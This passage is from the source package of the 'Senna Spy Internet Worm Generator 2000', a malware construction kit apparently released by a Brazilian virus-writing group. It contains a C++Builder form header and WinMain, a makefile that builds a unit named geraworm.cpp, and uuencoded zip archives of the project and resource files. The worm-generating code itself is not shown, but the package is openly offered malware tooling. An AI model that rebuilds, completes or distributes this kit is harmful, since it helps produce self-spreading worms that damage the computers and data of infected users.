    void __fastcall ButtonClearClick(TObject *Sender);
private:	// User declarations
public:		// User declarations
        __fastcall TFormWorm(TComponent* Owner);
};
//---------------------------------------------------------------------------
extern PACKAGE TFormWorm *FormWorm;
//---------------------------------------------------------------------------
#endif
/////////////////////////////////////////////////////////////////////////////
///////////////////////////////// formain.h /////////////////////////////////
/////////////////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////////////////
////////////////////////////////  ssiwg.cpp /////////////////////////////////
/////////////////////////////////////////////////////////////////////////////
//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop
USERES("ssiwg.res");
USEFORM("formmain.cpp", FormWorm);
USEUNIT("geraworm.cpp");
//---------------------------------------------------------------------------
WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
        try
        {
                 Application->Initialize();
                 Application->CreateForm(__classid(TFormWorm), &FormWorm);
                 Application->Run();
        }
        catch (Exception &exception)
        {
                 Application->ShowException(&exception);
        }
        return 0;
}
//---------------------------------------------------------------------------
/////////////////////////////////////////////////////////////////////////////
////////////////////////////////  ssiwg.cpp /////////////////////////////////
/////////////////////////////////////////////////////////////////////////////

/////////////////////////////////////////////////////////////////////////////
///////////////////////////////// ssiwg.brp /////////////////////////////////
/////////////////////////////////////////////////////////////////////////////
# ---------------------------------------------------------------------------
!if !$d(BCB)
BCB = $(MAKEDIR)\..
!endif

# ---------------------------------------------------------------------------
# IDE SECTION
# ---------------------------------------------------------------------------
# The following section of the project makefile is managed by the BCB IDE.
# It is recommended to use the IDE to change any of the values in this
# section.
# ---------------------------------------------------------------------------

VERSION = BCB.04.04
# ---------------------------------------------------------------------------
PROJECT = ssiwg.exe
OBJFILES = ssiwg.obj formmain.obj geraworm.obj
RESFILES = ssiwg.res
RESDEPEN = $(RESFILES) formmain.dfm
LIBFILES =
IDLGENFILES =
IDLFILES =
LIBRARIES = Vcl40.lib
SPARELIBS = Vcl40.lib
PACKAGES = Vcl40.bpi Vclx40.bpi vcljpg40.bpi Vclmid40.bpi Vcldb40.bpi rxctl4.bpi rxdb4.bpi
DEFFILE =
# ---------------------------------------------------------------------------
PATHCPP = .;
PATHASM = .;
PATHPAS = .;
PATHRC = .;
DEBUGLIBPATH = $(BCB)\lib\debug
RELEASELIBPATH = $(BCB)\lib\release
USERDEFINES =
SYSDEFINES = NO_STRICT
# ---------------------------------------------------------------------------
CFLAG1 = -I"..\..\..\..\WINNT\Profiles\Administrador\Desktop\Senna Spy Internet Worm Generator 2000";$(BCB)\include;$(BCB)\include\vcl \
  -O2 -Hc -H=$(BCB)\lib\vcl40.csm -w -Ve -a8 -k- -vi -c -b- -w-par -w-inl -Vx -tW \
  -tWM -D$(SYSDEFINES);$(USERDEFINES)
IDLCFLAGS = -I"..\..\..\..\WINNT\Profiles\Administrador\Desktop\Senna Spy Internet Worm Generator 2000" \
  -I$(BCB)\include -I$(BCB)\include\vcl -src_suffixcpp
PFLAGS = -U$(BCB)\Projects\Lib;"..\..\..\..\WINNT\Profiles\Administrador\Desktop\Senna Spy Internet Worm Generator 2000";$(BCB)\lib\obj;$(BCB)\lib;$(RELEASELIBPATH) \
  -I"..\..\..\..\WINNT\Profiles\Administrador\Desktop\Senna Spy Internet Worm Generator 2000";$(BCB)\include;$(BCB)\include\vcl \
  -$Y- -$L- -$D- -v -JPHNE -M
RFLAGS = -i"..\..\..\..\WINNT\Profiles\Administrador\Desktop\Senna Spy Internet Worm Generator 2000";$(BCB)\include;$(BCB)\include\vcl
AFLAGS = /i"..\..\..\..\WINNT\Profiles\Administrador\Desktop\Senna Spy Internet Worm Generator 2000" \
  /i$(BCB)\include /i$(BCB)\include\vcl /mx /w2 /zn
LFLAGS = -L$(BCB)\Projects\Lib;"..\..\..\..\WINNT\Profiles\Administrador\Desktop\Senna Spy Internet Worm Generator 2000";$(BCB)\lib\obj;$(BCB)\lib;$(RELEASELIBPATH) \
  -aa -Tpe -x -Gn
# ---------------------------------------------------------------------------
ALLOBJ = c0w32.obj sysinit.obj $(OBJFILES)
ALLRES = $(RESFILES)
ALLLIB = $(LIBFILES) $(LIBRARIES) import32.lib cp32mt.lib
# ---------------------------------------------------------------------------
!ifdef IDEOPTIONS

[Version Info]
IncludeVerInfo=0
AutoIncBuild=0
MajorVer=1
MinorVer=0
Release=0
Build=0
Debug=0
PreRelease=0
Special=0
Private=0
DLL=0
Locale=1046
CodePage=1252

[Version Info Keys]
CompanyName=
FileDescription=
FileVersion=1.0.0.0
InternalName=
LegalCopyright=
LegalTrademarks=
OriginalFilename=
ProductName=
ProductVersion=1.0.0.0
Comments=

[HistoryLists\hlIncludePath]
Count=1
Item0=..\..\..\..\WINNT\Profiles\Administrador\Desktop\Senna Spy Internet Worm Generator 2000;$(BCB)\include;$(BCB)\include\vcl

[HistoryLists\hlLibraryPath]
Count=1
Item0=$(BCB)\Projects\Lib;..\..\..\..\WINNT\Profiles\Administrador\Desktop\Senna Spy Internet Worm Generator 2000;$(BCB)\lib\obj;$(BCB)\lib

[HistoryLists\hlDebugSourcePath]
Count=1
Item0=$(BCB)\source\vcl

[Debugging]
DebugSourceDirs=$(BCB)\source\vcl

[Parameters]
RunParams=
HostApplication=
RemoteHost=
RemotePath=
RemoteDebug=0

[Compiler]
InMemoryExe=0
ShowInfoMsgs=0

[CORBA]
AddServerUnit=1
AddClientUnit=1
PrecompiledHeaders=1

!endif

# ---------------------------------------------------------------------------
# MAKE SECTION
# ---------------------------------------------------------------------------
# This section of the project file is not used by the BCB IDE.  It is for
# the benefit of building from the command-line using the MAKE utility.
# ---------------------------------------------------------------------------

.autodepend
# ---------------------------------------------------------------------------
!if !$d(BCC32)
BCC32 = bcc32
!endif

!if !$d(CPP32)
CPP32 = cpp32
!endif

!if !$d(DCC32)
DCC32 = dcc32
!endif

!if !$d(TASM32)
TASM32 = tasm32
!endif

!if !$d(LINKER)
LINKER = ilink32
!endif

!if !$d(BRCC32)
BRCC32 = brcc32
!endif

!if !$d(IDL2CPP)
IDL2CPP = idl2cpp
!endif

# ---------------------------------------------------------------------------
!if $d(PATHCPP)
.PATH.CPP = $(PATHCPP)
.PATH.C   = $(PATHCPP)
!endif

!if $d(PATHPAS)
.PATH.PAS = $(PATHPAS)
!endif

!if $d(PATHASM)
.PATH.ASM = $(PATHASM)
!endif

!if $d(PATHRC)
.PATH.RC  = $(PATHRC)
!endif
# ---------------------------------------------------------------------------
$(PROJECT): $(IDLGENFILES) $(OBJFILES) $(RESDEPEN) $(DEFFILE)
    $(BCB)\BIN\$(LINKER) @&&!
    $(LFLAGS) +
    $(ALLOBJ), +
    $(PROJECT),, +
    $(ALLLIB), +
    $(DEFFILE), +
    $(ALLRES)
!
# ---------------------------------------------------------------------------
.pas.hpp:
    $(BCB)\BIN\$(DCC32) $(PFLAGS) {$< }

.pas.obj:
    $(BCB)\BIN\$(DCC32) $(PFLAGS) {$< }

.cpp.obj:
    $(BCB)\BIN\$(BCC32) $(CFLAG1) -n$(@D) {$< }

.c.obj:
    $(BCB)\BIN\$(BCC32) $(CFLAG1) -n$(@D) {$< }

.c.i:
    $(BCB)\BIN\$(CPP32) $(CFLAG1) -n. {$< }

.cpp.i:
    $(BCB)\BIN\$(CPP32) $(CFLAG1) -n. {$< }

.asm.obj:
    $(BCB)\BIN\$(TASM32) $(AFLAGS) $<, $@

.rc.res:
    $(BCB)\BIN\$(BRCC32) $(RFLAGS) -fo$@ $<
# ---------------------------------------------------------------------------
/////////////////////////////////////////////////////////////////////////////
///////////////////////////////// ssiwg.brp /////////////////////////////////
/////////////////////////////////////////////////////////////////////////////


/////////////////////////////////////////////////////////////////////////////
ssiwg.cpr (UUEncodado Zipado)
/////////////////////////////////////////////////////////////////////////////
_=_ 
_=_ Part 001 of 001 of file ssiwg.zip
_=_ 
begin 666 ssiwg.zip
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
64$L%!@`````!``$`-P```'<&````````
`
end
/////////////////////////////////////////////////////////////////////////////


/////////////////////////////////////////////////////////////////////////////
ssiwg.res (UUEncodado Zipado)
/////////////////////////////////////////////////////////////////////////////
_=_ 
_=_ Part 001 of 001 of file ssiwg2.zip
_=_ 
begin 666 ssiwg2.zip
M4$L#!!0``@`(`)F;5BA\D_D\,0$``&P#```)````<W-I=V<N<F5SG9//2L0P
M$,:G?Z`WW8-XM4>/OH&*@41$?14/"SDVA\`&5MC'J<<^BD>/'GM8B-^D39M6
M%L1)OZ:37V<2D@P140UY/VAM7WGD!92%L<WFLHS\>HR_@S(:AW,Z828\9,S0
M<>,AO+JNXUG"PPL)';>P+D_-.^Q@][!O;;1I'.R@GMJV=:YW?<)-PM5'*_N$
MV[V5"ZZD6'`GY4ZC35S(,%]UC'SXO^ICO/1L$Q=2:+'5,Q=BM[4TQS.'WT_Y
M5UPLN5QQSB]5$L_YS<2M1;RBF2LK+/9XYDX`)]R4?!9A@P./_K_Y<-0S'_TU
M]X$[-_J5QBXZAX]X6;361&_T-S-+%2=40>?0%71K*&^Z7RI\JD_HB,5>(.]-
MN)IG]$SW]$@OT`.]HH^6U@570T9U78:JX"K*Z`=02P$"%``4``(`"`"9FU8H
M?)/Y/#$!``!L`P``"0```````````"``MH$`````<W-I=V<N<F5S4$L%!@``
0```!``$`-P```%@!````````
`
end
/////////////////////////////////////////////////////////////////////////////


 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴    
                       Copyright  2001, V죚us Brasil 
 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
